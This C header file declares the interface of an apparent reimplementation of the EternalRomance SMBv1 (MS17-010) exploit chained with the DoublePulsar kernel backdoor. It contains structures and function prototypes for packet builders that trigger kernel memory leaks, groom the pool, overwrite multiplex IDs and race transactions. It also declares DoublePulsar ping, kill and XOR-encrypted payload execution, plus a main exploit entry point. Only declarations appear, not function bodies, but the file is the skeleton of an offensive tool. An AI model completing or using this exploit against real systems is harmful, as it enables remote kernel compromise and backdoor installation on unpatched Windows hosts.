#pragma once
#pragma once
#ifndef UNICODE
#define UNICODE
#endif
#include "treeconnectandx.h"
#include <Windows.h>
#include <winternl.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <wchar.h>
#include <wincrypt.h>
#include "ntcreateandx.h"
#include "smbpacketstrings.h"

#pragma intrinsic(memcpy, memset, memcmp)
#pragma auto_inline(off)

#pragma pack(push, 1)

typedef struct _SMB_HEADER {
	BYTE Protocol[4];
	BYTE Command;
	union {
		struct {
			BYTE ErrorClass;
			BYTE Reserved;
			WORD Error;
		}DosError;
		DWORD NtStatus;
	}Status;
	BYTE Flags;
	WORD Flags2;
	union {
		WORD Reserved[6];
		struct {
			WORD PidHigh;
			union {
				struct {
					DWORD Key;
					WORD Sid;
					WORD SequenceNumber;
					WORD Gid;
				};
				BYTE SecuritySignature[8];
			};
		};
	};
	WORD Tid;
	WORD Pid;
	WORD Uid;
	WORD Mid;
}SMB_HEADER, * PSMB_HEADER;

#pragma pack(pop)

struct smb_info {
	WORD fid;
	WORD tid;
	WORD pid;
	WORD uid;
	WORD mid;
	WORD special_mid;
	WORD special_pid;
	UNICODE_STRING tree_connection;
	STRING tree_connect_andx_svc;
	BYTE AndxCommand;
	WORD AndxOffset;
	PVOID sockaddrpointer;
	PVOID socketpointer;
	PVOID wsapointer;
	DWORD_PTR connection_handle;
	DWORD srv_last_error;
	BYTE headerinfo[32];
	BOOL DoublePulsarInstalled;
	WORD DoublePulsarXorKey;
	WORD TransIndataShiftCount;
	WORD TransFragTagOffset;
	WORD TransConnectionOffset;
	ULONG_PTR LastOOBReadAddress;
	ULONG_PTR LastOOBWriteAddress;
};

typedef struct BUFFER {
	DWORD dwsize;
	PBYTE pbdata;
}BUFWITHSIZE, * PBUFWITHSIZE;

struct LeakedDataLinkedList {
	BUFFER  KrnlLeakResponse;
	PDWORD ResponseNetbios;
	PSMB_HEADER ResponseHeader;
	PBYTE ResponseParameters;
	PBYTE ResponseData;
	LeakedDataLinkedList* NextEntry;
};

struct ResponsePacketLinkedList {
	BUFFER ThisPacket;
	PSMB_HEADER ThisSmb;
	PVOID ThisNetbiosSize;	//(WORD *)
	ResponsePacketLinkedList* NextEntry;
};

struct RequestPacketLinkedList {
	BUFFER ThisPacket;
	PSMB_HEADER ThisSmb;
	PVOID ThisNetbiosSize;	//(WORD *)
	RequestPacketLinkedList* NextEntry;
};

#pragma pack(push, 1)

typedef struct ANYPOINTER {
	union {
		PVOID pvpointer;
		PBYTE pbpointer;
		PSTR ppointer;
		PWSTR pwpointer;
		ULONG_PTR address;
		ULONG_PTR* paddress;
		BYTE addressbytes[sizeof(PVOID)];
	};
}*PANYPOINTER;

typedef struct SMBLIB_LAST_TRANS2_SESSION_SETUP_REQUEST {
	union {
		ANYPOINTER AnyNetbiosSizeAddress;
		WORD* NetbiosSize;
	};

	union {
		ANYPOINTER SmbAnyAddress;
		PSMB_HEADER Smb;
	};
	
	union {
		ANYPOINTER Transaction2AnyAddress;
		PREQ_TRANSACTION2 Trans2;
	};

	union {
		ANYPOINTER Trans2SessionSetupAnyAddress;
		PREQ_TRANSACTION2_SESSION_SETUP Trans2SessionSetup;
	};
}*PSMBLIB_LAST_TRANS2_SESSION_SETUP_REQUEST;

#pragma pack(pop)

typedef PBYTE(*packet_creation_handler_type_one)(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid);

BOOL __cdecl __memcmp(const void* a, const void* b, DWORD size);

#define cpy(dst, src, size)		(memcpy(dst, src, (size_t)(size)))
#define cmp(a, b, size)			(__memcmp(a, b, size))
#define bzero(ptr, size)		(memset((ptr), 0x00, (size_t)(size)))


BOOL find_memory_pattern(BUFFER IN* bws, PANYPOINTER IN OUT result, const void* IN pattern, DWORD IN patternsize);
VOID update_smb_info(smb_info* info, BUFFER* IN newpacket);
void csprng(PBYTE buffer, DWORD size);
unsigned int random(void);

DWORD __stdcall FindLeakedTrans2DispatchTable(BUFFER IN* bws);
DWORD __stdcall GetDoublePulsarStatusCode(BUFFER* IN bws, BUFFER IN* request);
DWORD __stdcall GetDoublePulsarOpCode(BUFFER* IN bws);
BOOL __stdcall GenerateDoublePulsarOpcodePacket(BUFFER* IN OUT bws, BYTE opcode);
DWORD __stdcall GetDoublePulsarXorKey(BUFFER* IN bws);
ULONG_PTR __stdcall GetOOBWriteAddress(BUFFER* IN packet);

//parameters is output, opcode is input, and if opcode == DOPU_EXEC_OPCODE then datalength is a pointer to length of payload, if opcode is exec specify the dopu arguement
PBYTE GenerateDoublePulsarTrans2SessionSetupParameters(BUFFER* IN OUT parameters, DWORD IN opcode, DWORD* IN OPTIONAL datalength, DWORD IN OPTIONAL xorkey, PSMBLIB_LAST_TRANS2_SESSION_SETUP_REQUEST last_trans2_session_setup_req);//PBYTE GenerateDoublePulsarTrans2SessionSetupParameters(BUFFER* IN OUT parameters, DWORD IN opcode, DWORD *IN OPTIONAL datalength, DWORD IN OPTIONAL xorkey);
PBYTE PadDoPuPayloadToProperSize(BUFFER IN OUT* payload);
BOOL __stdcall XorEncryptPayload(BUFFER IN OUT* payload, DWORD IN xorkey);


ULONG_PTR** __stdcall GetAllOOBReadAddressesFromMultiRequest(BUFFER* IN packet, DWORD IN smbcount);
DWORD __stdcall FindLeakedDataFragTag(BUFFER IN* packet);
DWORD __stdcall FindLeadedDataLStrTag(BUFFER IN* packet);

BOOL AllocateSmbLibLastTrans2SessionSetupRequestStructure(SMBLIB_LAST_TRANS2_SESSION_SETUP_REQUEST** IN OUT pointertostructpointer, DWORD IN numbertoallocate);
BOOL FreeSmbLibLastTrans2SessionSetupRequestStructure(SMBLIB_LAST_TRANS2_SESSION_SETUP_REQUEST** IN OUT pointertostructpointer);

/*
 *
 *
 *	memory allocation buffer with size functions
 *
 *
 */

void bwsalloc(BUFFER OUT* bws, DWORD IN size);
void bwsfree(BUFFER IN* bws);
BOOL bwscat(BUFFER IN OUT* dst, BUFFER IN* src);

BUFFER* OUT bwsnew(DWORD IN count);
BOOL bwsdelete(BUFFER **IN OUT bws);
BOOL bwsallocateandcopy(BUFFER IN OUT* bws, const void IN* src, DWORD IN size);



/*
 *
 *
 *	Linked list functions
 *
 *
 */

void __stdcall FreeRequestLinkedListBuffers(RequestPacketLinkedList* IN OUT liststart, DWORD* IN ListElementCount);
void __stdcall FreeResponseLinkedListBuffers(ResponsePacketLinkedList* IN OUT liststart, DWORD* IN ListElementCount);
void __stdcall FreeLeakdataLinkedListBuffers(LeakedDataLinkedList* IN OUT liststart, DWORD* IN ListElementCount);
void __stdcall FreeRequestLinkedListSingleEntry(RequestPacketLinkedList* IN OUT entrypointer);
void __stdcall FreeResponseLinkedListSingleEntry(ResponsePacketLinkedList* IN OUT entry);

/*
 *
 *
 *	STRING functions
 *
 *
 */

void __stdcall InitString(PCSTR IN cstr, STRING* IN OUT str);
void __stdcall FreeString(STRING* IN OUT str);
void __stdcall InitUnicodeString(PCWSTR IN cstr, UNICODE_STRING* IN OUT str);
void __stdcall FreeUnicodeString(UNICODE_STRING* IN OUT str);
void __stdcall ConvertStringToUnicode(STRING* IN s, UNICODE_STRING* IN OUT u);
void __stdcall ConvertUnicodeToString(UNICODE_STRING* IN u, STRING* IN OUT s);
void DumpHex(const void* vdata, DWORD size);

WORD get_pid(smb_info*);
WORD get_uid(smb_info*);
WORD get_mid(smb_info*);
WORD get_tid(smb_info*);
WORD get_fid(smb_info*);
WORD get_special_mid(smb_info*);
WORD get_special_pid(smb_info*);
void set_pid(smb_info*, WORD);
void set_uid(smb_info*, WORD);
void set_mid(smb_info*, WORD);
void set_tid(smb_info*, WORD);
void set_fid(smb_info*, WORD);
void set_special_mid(smb_info*, WORD);
void set_special_pid(smb_info*, WORD);


/*
 *
 *
 *	networking functions
 *
 *
 */

unsigned int TargetConnect(SOCKET& s, sockaddr_in& sa, WSAData& wsa, const char* targetip, unsigned int& status);
unsigned int SendData(BUFFER IN OUT* bws, SOCKET& s, unsigned int& status);
unsigned int RecvData(BUFFER IN OUT* bws, DWORD IN bufsize, SOCKET& s, unsigned int& status);
unsigned int CloseAndClearSocket(SOCKET IN OUT& sfd, BOOLEAN IN WSAClean);


/*
 *
 *
 *	begin smb packet creation functions
 *
 *
 */

 /*
  *
  *
  *	EternalRomance packet creation functions
  *
  *
  */

PBYTE negotiate_request_packet(BUFFER* IN OUT bws, WORD pid, WORD uid, WORD mid, WORD tid);
PBYTE session_setup_packet(BUFFER IN OUT* bws, WORD pid, WORD uid, WORD mid, WORD tid);
PBYTE tree_connect_packet(BUFFER IN OUT* bws, UNICODE_STRING* unc, WORD pid, WORD uid, WORD mid, WORD tid);
PBYTE nt_create_andx_packet(BUFFER IN OUT* bws, WORD rootfid, WORD pid, WORD uid, WORD mid, WORD tid);
PBYTE trans_dcerpc_bind_packet(BUFFER IN OUT* bws, WORD pid, WORD uid, WORD mid, WORD tid);
PBYTE write_andx_lsarpc_getusername_packet(BUFFER IN OUT* bws, WORD pid, WORD uid, WORD mid, WORD tid);
PBYTE trans_trigger_first_leak_packet(BUFFER IN OUT* bws, WORD pid, WORD uid, WORD mid, WORD tid);
PBYTE trans_groom_type_one_packet(BUFFER IN OUT* bws, WORD pid, WORD uid, WORD mid, WORD tid);
PBYTE trans_multirequest_type_one_packet(BUFFER IN OUT* bws, WORD pid, WORD uid, WORD* mids, WORD tid);
PBYTE trans_multirequest_type_one_number_two_packet(BUFFER IN OUT* bws, WORD pid, WORD uid, WORD* mids, WORD tid);
PBYTE trans_multirequest_type_one_number_three_packet(BUFFER IN OUT* bws, WORD pid, WORD uid, WORD mid, WORD tid);
PBYTE trans_groom_type_two_packet(BUFFER IN OUT* bws, WORD pid, WORD uid, WORD mid, WORD tid);
PBYTE trans_secondary_trigger_second_leak_packet(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid);
PBYTE write_andx_shift_indata_packet(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid, WORD IN fid);
PBYTE trans_secondary_mid_overwrite_packet(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid);
PBYTE trans_secondary_first_mid_zero_packet(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid);
PBYTE trans_secondary_first_special_mid_packet(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid);
PBYTE trans_secondary_race_type_one_packet(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid);
PBYTE trans_secondary_second_mid_zero_packet(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid);
PBYTE trans_secondary_race_type_two_packet(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid);
PBYTE trans_secondary_third_mid_zero_packet(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid);
PBYTE trans_secondary_second_race_type_two_packet(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid);
PBYTE trans_secondary_fourth_mid_zero_packet(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid);
PBYTE trans_secondary_third_race_type_two_packet(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid);
PBYTE nt_create_andx_second_packet(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid);
PBYTE trans_secondary_fifth_mid_zero_packet(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid);

/*
 *
 *
 *	DoublePulsar smb packet creation functions
 *
 *
 */

PBYTE trans2_session_setup_packet(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid);
PBYTE trans2_session_setup_dopu_kill(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid);
PBYTE trans2_session_setup_dopu_ping(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid);
PBYTE trans2_session_setup_dopu_exec(BUFFER IN OUT* bws, BUFFER IN* xorkeypacket, BUFFER IN* payload, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid);

PBYTE tree_disconnect_packet(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid);
PBYTE logoff_andx_packet(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid);

PBYTE trans_peek_namedpipe_check_packet(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid);

BOOLEAN SendRecvNegotiate(RequestPacketLinkedList  OUT* outbound, ResponsePacketLinkedList OUT* inbound, SOCKET& s, smb_info* info);
BOOLEAN SendRecvSessionSetupAndx(RequestPacketLinkedList  OUT* outbound, ResponsePacketLinkedList OUT* inbound, SOCKET& s, smb_info* info);
BOOLEAN SendRecvTreeConnectAndx(RequestPacketLinkedList  OUT* outbound, ResponsePacketLinkedList OUT* inbound, SOCKET& s, smb_info* info, PCWSTR IN ip);
BOOLEAN SendRecvNtCreateAndx(RequestPacketLinkedList* OUT outbound, ResponsePacketLinkedList OUT* inbound, SOCKET& s, smb_info* IN info);
BOOLEAN SendRecvTransDcerpcBind(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, SOCKET& IN s, smb_info IN* info);
BOOLEAN SendRecvLsaGetUsername(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, SOCKET& IN s, smb_info IN* info);
BOOLEAN SendRecvTransFirstLeakTrigger(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, LeakedDataLinkedList* IN OUT leak, SOCKET& IN s, smb_info IN* info);
BOOLEAN SendRecvTransGroomTypeOne(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, SOCKET& IN s, smb_info IN* info);
BOOLEAN SendRecvTransFirstMultiRequestTypeOne(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, SOCKET& IN s, smb_info IN* info);
BOOLEAN SendRecvTransSecondMultiRequestTypeOne(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, SOCKET& IN s, smb_info IN* info);
BOOLEAN SendRecvTransThirdMultiRequestTypeOne(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, SOCKET& IN s, smb_info IN* info);
BOOLEAN SendRecvTransGroomTypeTwo(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, SOCKET& IN s, smb_info IN* info);
BOOLEAN SendRecvTransSecondarySecondLeakTrigger(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, LeakedDataLinkedList* IN OUT leak, SOCKET& IN s, smb_info IN* info);
BOOLEAN SendRecvWriteAndxIndataShift(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, SOCKET& IN s, smb_info* IN info);
BOOLEAN SendRecvTransSecondaryMultiplexOverwrite(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, SOCKET& IN s, smb_info* IN info);
BOOLEAN SendRecvTransSecondaryFirstMuliplexZero(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, SOCKET& IN s, smb_info* IN info);
BOOLEAN SendRecvTransSecondaryFirstSpecialMultiplex(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, SOCKET& IN s, smb_info* IN info);
BOOLEAN SendRecvTransSecondaryRaceTypeOne(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, LeakedDataLinkedList* IN OUT leak, SOCKET& IN s, smb_info* IN info);
BOOLEAN SendRecvTransSecondarySecondMultiplexZero(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, SOCKET& IN s, smb_info* IN info);
BOOLEAN SendRecvTransSecondaryRaceTypeTwo(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, LeakedDataLinkedList* IN OUT leak, SOCKET& IN s, smb_info* IN info);
BOOLEAN SendRecvTransSecondaryThirdMultiplexZero(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, SOCKET& IN s, smb_info* IN info);
BOOLEAN SendRecvTransSecondarySecondRaceTypeTwo(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, LeakedDataLinkedList* IN OUT leak, SOCKET& IN s, smb_info* IN info);
BOOLEAN SendRecvTransSecondaryFourthMultiplexZero(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, SOCKET& IN s, smb_info* IN info);
BOOLEAN SendRecvTransSecondaryThirdRaceTypeTwo(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, LeakedDataLinkedList* IN OUT leak, SOCKET& IN s, smb_info* IN info);
BOOLEAN SendRecvSecondNtCreateAndx(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, SOCKET& IN s, smb_info* IN info);

/*
 *
 *
 *
 *	DoublePulsar Networking Functions
 *
 *
 */

BOOLEAN SendRecvTrans2SessionSetup(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, SOCKET& IN s, smb_info* IN info);
BOOLEAN SendRecvTreeDisconnect(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, SOCKET& IN s, smb_info* IN info);
BOOLEAN SendRecvLogoffAndx(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, SOCKET& IN s, smb_info* IN info);

/*
 *
 *
 *
 *	Equation Group MS17-10 vulnerability check networking function
 *
 *
 */
 //sends transaction PEEK_NMPIPE request on FID 0 and recieves its response
BOOLEAN SendRecvTransPeekNamedPipeCheck(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, SOCKET& IN s, smb_info* IN info);


/*
 *
 *
 *
 *		Threaded functions
 *
 *
 *
 */

#ifdef _WIN64
INT_PTR __stdcall MainExploitEntry(void);
#else
int __stdcall MainExploitEntry(void);
#endif // _WIN64


BOOLEAN __stdcall readfile(UNICODE_STRING* filename, BUFFER* IN OUT filedata);
//BOOLEAN __stdcall writefile(UNICODE_STRING* filename, BUFFER* IN filedata);


//DWORD __stdcall EternalRomanceIsVulnerableLeak(PVOID pvip);
//DWORD __stdcall EternalRomanceExploit(PVOID pvip);
//DWORD __stdcall DoublePulsarCheckIsInstalled(PVOID pvip);
//DWORD __stdcall EquationGroupIsVulnerableCheck(PVOID pvip);